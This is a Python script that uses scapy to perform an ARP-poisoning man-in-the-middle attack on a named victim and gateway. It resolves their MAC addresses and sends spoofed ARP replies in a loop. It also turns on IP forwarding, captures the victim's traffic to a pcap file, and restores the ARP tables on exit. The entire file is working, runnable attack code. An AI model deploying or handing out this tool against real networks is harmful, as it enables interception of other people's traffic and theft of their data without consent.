from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time
import subprocess


def get_mac(target_ip):
    """helper function to get MAC address for any given machine"""
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
    response, _ = srp(packet, timeout=7, retry=10, verbose=False)  # receive packet in network L2
    for _, r in response:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface="eth0"):
        self.victim = victim
        self.victimmac = get_mac(target_ip=victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(target_ip=gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}')
        print(f'Victim ({victim}) is at {self.victimmac}')
        print('-'*30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    # def sniff(self, count=1000):
    #     time.sleep(7)
    #     print(f'Sniffing {count} packets')
    #     bpf_filter = "ip host %s" % victim
    #     packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
    #     wrpcap('arper.pcap', packets)
    #     print('Got the packets')
    #     self.restore()
    #     self.poison_thread.terminate()
    #     print('Finished.')

    def sniff(self):
        time.sleep(7)
        print('Sniffing packets...')
        bpf_filter = "ip host %s" % self.victim
        packets = sniff(filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
    
        print('Packets sniffed and saved to arper.pcap')
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),
             count=5)
        send(ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
             count=5)


if __name__ == "__main__":
    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
    print("[+] Successful enabled IP forwarding..")
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    my_arp = Arper(victim=victim, gateway=gateway, interface=interface)
    my_arp.run()
